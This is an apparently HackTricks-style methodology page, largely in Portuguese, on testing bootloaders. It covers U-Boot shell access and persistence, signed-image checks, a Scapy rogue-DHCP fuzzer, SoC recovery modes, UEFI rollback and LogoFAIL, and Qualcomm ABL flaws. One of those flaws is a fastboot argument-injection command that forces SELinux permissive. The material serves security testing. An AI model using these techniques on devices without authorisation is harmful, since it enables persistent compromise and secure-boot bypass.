# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

As etapas a seguir são recomendadas para modificar configurações de inicialização do dispositivo e testar bootloaders como U-Boot e carregadores da classe UEFI. Foque em obter execução de código cedo, avaliar proteções de assinatura/rollback e abusar de caminhos de recuperação ou net-boot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- Durante o boot, pressione uma tecla de interrupção conhecida (frequentemente qualquer tecla, 0, espaço ou uma sequência "mágica" específica da placa) antes de `bootcmd` ser executado para cair no prompt do U-Boot.

2. Inspect boot state and variables
- Comandos úteis:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Modify boot arguments to get a root shell
- Anexe `init=/bin/sh` para que o kernel inicie um shell em vez do init normal:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- Configure a rede e recupere um kernel/fit image pela LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- Se o armazenamento de env não estiver protegido para escrita, você pode persistir o controle:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Verifique variáveis como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influenciam caminhos de fallback. Valores mal configurados podem permitir quebras repetidas para o shell.

6. Check debug/unsafe features
- Procure por: `bootdelay` > 0, `autoboot` desabilitado, `usb start; fatload usb 0:1 ...` sem restrições, habilidade de `loady`/`loads` via serial, `env import` de mídia não confiável, e kernels/ramdisks carregados sem checagens de assinatura.

7. U-Boot image/verification testing
- Se a plataforma afirma secure/verified boot com imagens FIT, tente imagens não assinadas e manipuladas:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Ausência de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou comportamento legado `verify=n` frequentemente permite bootar payloads arbitrários.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- O manejo legacy BOOTP/DHCP do U-Boot já teve problemas de segurança de memória. Por exemplo, CVE‑2024‑42040 descreve uma divulgação de memória via responses DHCP criados que podem leak bytes da memória do U-Boot de volta na rede. Exercite os caminhos de código DHCP/PXE com valores excessivamente longos/casos de borda (option 67 bootfile-name, vendor options, campos file/servername) e observe travamentos/leaks.
- Snippet mínimo em Scapy para estressar parâmetros de boot durante netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valide também se campos de filename do PXE são passados para lógica de shell/loader sem sanitização quando encadeados a scripts de provisionamento do lado do OS.

9. Rogue DHCP server command injection testing
- Configure um serviço DHCP/PXE rogue e tente injetar caracteres nos campos filename ou options para alcançar interpretadores de comando em estágios posteriores da cadeia de boot. O auxiliary DHCP do Metasploit, `dnsmasq`, ou scripts Scapy customizados funcionam bem. Isole a rede de laboratório primeiro.

## SoC ROM recovery modes that override normal boot

Muitos SoCs expõem um modo BootROM "loader" que aceita código por USB/UART mesmo quando imagens de flash são inválidas. Se os fuses de secure-boot não estiverem queimados, isso pode fornecer execução arbitrária de código muito cedo na cadeia.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Avalie se o dispositivo tem eFuses/OTP de secure-boot queimados. Se não, os modos de download do BootROM frequentemente bypassam qualquer verificação de nível superior (U-Boot, kernel, rootfs) executando seu payload de primeira etapa diretamente da SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Monte a EFI System Partition (ESP) e verifique componentes do loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, caminhos de logo do vendor.
- Tente bootar com componentes assinados downgraded ou conhecidos-vulneráveis se Secure Boot revocations (dbx) não estiverem atualizadas. Se a plataforma ainda confiar em shims/bootmanagers antigos, frequentemente é possível carregar seu próprio kernel ou `grub.cfg` da ESP para obter persistência.

11. Boot logo parsing bugs (LogoFAIL class)
- Vários firmwares OEM/IBV eram vulneráveis a falhas de parsing de imagem em DXE que processam boot logos. Se um atacante puder colocar uma imagem craftada na ESP sob um caminho específico do vendor (ex.: `\EFI\<vendor>\logo\*.bmp`) e reiniciar, execução de código durante o early boot pode ser possível mesmo com Secure Boot habilitado. Teste se a plataforma aceita logos fornecidos pelo usuário e se esses caminhos são graváveis a partir do OS.

## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Em dispositivos Android 16 que usam o ABL da Qualcomm para carregar a **Generic Bootloader Library (GBL)**, valide se o ABL **autentica** o UEFI app que carrega da partição `efisp`. Se o ABL apenas verifica a **presença** do UEFI app e não valida assinaturas, um primitive de escrita em `efisp` se torna **pre-OS unsigned code execution** no boot.

Checks práticos e caminhos de abuso:

- **efisp write primitive**: Você precisa de um meio para escrever um UEFI app customizado em `efisp` (root/serviço privilegiado, bug em app OEM, caminho recovery/fastboot). Sem isso, o gap de carregamento do GBL não é diretamente alcançável.
- **fastboot OEM argument injection** (ABL bug): Algumas builds aceitam tokens extras em `fastboot oem set-gpu-preemption` e os anexam ao cmdline do kernel. Isso pode ser usado para forçar SELinux permissivo, permitindo gravações em partições protegidas:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Se o dispositivo estiver corrigido, o comando deve rejeitar argumentos extras.
- **Bootloader unlock via persistent flags**: Um payload em estágio de boot pode alterar flags persistentes de unlock (ex.: `is_unlocked=1`, `is_unlocked_critical=1`) para emular `fastboot oem unlock` sem os gates do servidor OEM/aprovação. Isso é uma mudança de postura durável após o próximo reboot.

Notas defensivas/triagem:

- Confirme se o ABL realiza verificação de assinatura no GBL/UEFI payload de `efisp`. Se não, trate `efisp` como uma surface de persistência de alto risco.
- Monitore se os handlers fastboot OEM do ABL foram corrigidos para **validar contagem de argumentos** e rejeitar tokens adicionais.

## Hardware caution

Tenha cautela ao interagir com SPI/NAND flash durante o early boot (ex.: aterrando pinos para burlar leituras) e sempre consulte o datasheet do flash. Curtos temporizados de forma incorreta podem corromper o dispositivo ou o programador.

## Notes and additional tips

- Tente `env export -t ${loadaddr}` e `env import -t ${loadaddr}` para mover blobs de environment entre RAM e armazenamento; algumas plataformas permitem importar env de mídia removível sem autenticação.
- Para persistência em sistemas Linux que bootam via `extlinux.conf`, modificar a linha `APPEND` (para injetar `init=/bin/sh` ou `rd.break`) na partição de boot é frequentemente suficiente quando nenhuma checagem de assinatura é aplicada.
- Se o userland fornece `fw_printenv/fw_setenv`, valide se `/etc/fw_env.config` corresponde ao armazenamento real de env. Offsets mal configurados permitem ler/escrever a região MTD errada.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
